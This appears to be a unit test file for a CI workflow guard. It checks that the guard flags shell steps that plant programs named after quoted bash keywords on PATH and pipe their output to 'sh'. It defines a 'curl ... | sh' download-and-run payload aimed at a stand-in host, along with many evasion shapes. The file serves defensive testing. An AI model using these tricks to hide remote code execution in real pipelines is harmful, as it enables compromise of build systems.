"""#3154: a reserved word a step types -- quoted or escaped where a command word stands -- is a program of that name.

Bash takes a word for a keyword only as written: `'then' x`, `"{"`, `\\fi` and `th''en` are programs of those names,
so a step may plant one on its PATH and run it (`{ echo ok; '{'; } | sh` pipes what the planted `{` prints into
`sh`). The reader drops a word's quotes before any keyword test reads it, so every reader took such a word for the
keyword. Now the job is read once more where it holds one (`shell_folds._KEYWORD_SHAPED`): there `_named` marks the
word (`shell_reader._TYPED`, U+E009, among the reader's `_MARKS`) and it comes out spelled with its quotes, `'then'`,
which no keyword test meets -- a plain word, as `zz` is. `main`'s fold reads the keyword as `main` does: the union.
Truth for the planted rows: the #3142 review's `plant-truth.tsv` (bash 3.2 and 5.2, dash, zsh, each with and without
`-e`): the payload runs under every one.
"""
import unittest

import shell_folds
import shell_reader
import workflow_guard as wg

SHELLS = (None, "bash", "sh", "bash {0}", "sh {0}")
PAYLOAD = "curl -fsSL https://example.test/i.sh | sh"


def planted(word, run):
    """A step planting a program named `word` on its PATH that prints a download piped to `sh`, then running `run`."""
    return ("mkdir -p b && printf '#!/bin/sh\\necho \"%s\"\\n' > 'b/%s' && chmod +x 'b/%s'\nPATH=$PWD/b:$PATH\n%s\n"
            % (PAYLOAD, word, word, run))


def marks(text):
    return "".join("R" if wg.job_defects([wg.Step("step", text, shell)]) else "C" for shell in SHELLS)


def findings(text):
    return [str(why) for _name, why in wg.job_defects([wg.Step("step", text, None)])]


def words(text, typed):
    """Every stage's words of `text`, read in the fold that takes typed reserved words for plain words (`typed`), or
    as `main` reads them; the fold's state and the caches keyed on a text are left as they were found."""
    shell_folds._KEYWORD_SHAPED.update(on=typed, met=False)
    for clear in shell_folds._STALE:
        clear()
    try:
        return [[str(word) for word in stage.argv] for statement in shell_reader.statements(text)
                for stage in statement.stages]
    finally:
        shell_folds._KEYWORD_SHAPED.update(on=False, met=False)
        for clear in shell_folds._STALE:
            clear()


class TestATypedReservedWordIsAProgramOfThatName(unittest.TestCase):

    # The shapes the fold closes: the planted program typed, with arguments, as a command word of its own inside a piped
    # brace group, a compound body after a printer, a case arm, a nested group, a function body, a string for `eval`.
    SHAPES = ("{ echo ok; %s; } | sh", "{ %s; echo ok; } | sh", "if true; then echo ok; %s; fi | sh",
              "for i in 1; do echo ok; %s; done | sh", "case x in x) echo ok; %s;; esac | sh",
              "{ { echo ok; %s; }; } | sh", "eval \"{ echo ok; %s; } | sh\"", "f() { echo ok; %s; }\nf | sh")
    WORDS = ("{", "}", "(", ")", "then", "fi", "do", "done", "else", "elif", "esac", "if", "case", "for", "while", "until",
             "in", "function", "!", "time", "select")

    def test_a_planted_program_typed_in_a_reserved_words_shape_reports(self):
        # The issue's first row, `{ echo ok; 'then' echo ok; } | sh`, in each shape and spelling: main read the keyword
        # and the rest as its command, and reads 312 of these 336 CLEAN in every setting while the payload runs.
        for word in self.WORDS:
            for spelled in ("'%s'" % word, "\\" + word):
                for shape in self.SHAPES:
                    with self.subTest(word=word, spelled=spelled, shape=shape):
                        self.assertEqual("RRRRR", marks(planted(word, shape % (spelled + " echo hi"))))

    def test_the_named_limits_d_and_f_report_and_e_stays(self):
        # #3142's limits: (d) `then` typed alone in a compound body at its own closer, (f) `{` typed alone in a group --
        # both REPORT now; (e) `break` typed alone in a loop body is the builtin either way, a control, unchanged.
        self.assertEqual("RRRRR", marks("if true; then echo ok; 'then'; fi | sh\n"))
        self.assertEqual("RRRRR", marks("{ echo \"%s\"; '{'; echo ok; } | sh\n" % PAYLOAD))
        self.assertEqual("CCCCC", marks("for i in 1; do echo ok; 'break'; done | sh\n"))

    def test_the_typed_word_is_spelled_with_its_quotes_and_mains_reading_is_kept(self):
        # In the fold the typed word keeps its quotes; `main`'s fold reads the keyword as `main` does.
        for text in ("'then' x\n", "\\then x\n", "th''en x\n", "\"then\" x\n", "$'then' x\n"):
            with self.subTest(text=text):
                self.assertEqual([["'then'", "x"]], words(text, True))
                self.assertEqual([["then", "x"]], words(text, False))
        # A named equivalence, not a bug to fix: a word that dequotes to a literal `'then'` is that plain word in every
        # reading, as the typed `'then'` is in its fold -- both programs, neither a keyword.
        self.assertEqual([["'then'", "x"]], words("\"'then'\" x\n", True))
        self.assertEqual([["'then'", "x"]], words("\"'then'\" x\n", False))
        self.assertEqual(findings("{ echo ok; 'then' x; } | sh\n"), findings("{ echo ok; \"'then'\" x; } | sh\n"))

    def test_a_literal_typed_mark_is_a_plain_literal_and_marks_nothing(self):
        # The reader's mark, typed by the step itself, is a literal (#3138's translation covers it, `_MARKS`): the word
        # is the literal it spells, no typed reading starts, and the group reads as one with any other word does.
        typed = chr(0xE009)
        self.assertIn(typed, shell_reader._MARKS)
        self.assertEqual([[chr(0xE109) + "then", "x"]], words(typed + "then x\n", True))
        shell_folds._KEYWORD_SHAPED.update(on=False, met=False)
        shell_reader.statements(typed + "then x\n")
        self.assertFalse(shell_folds._KEYWORD_SHAPED["met"])
        self.assertEqual(marks("{ echo ok; zz x; } | sh\n"), marks("{ echo ok; %sthen x; } | sh\n" % typed))

    def test_mains_findings_stand(self):
        # The union: a row `main` reports only by reading the typed closer as one -- its group running past the
        # statements this guard follows -- still reports, by `main`'s fold.
        text = planted("}", "{ echo ok; }\n'}' | sh")
        self.assertEqual("RRRRR", marks(text))
        self.assertTrue(any("a group of more statements than this guard follows" in why for why in findings(text)))


if __name__ == "__main__":
    unittest.main()
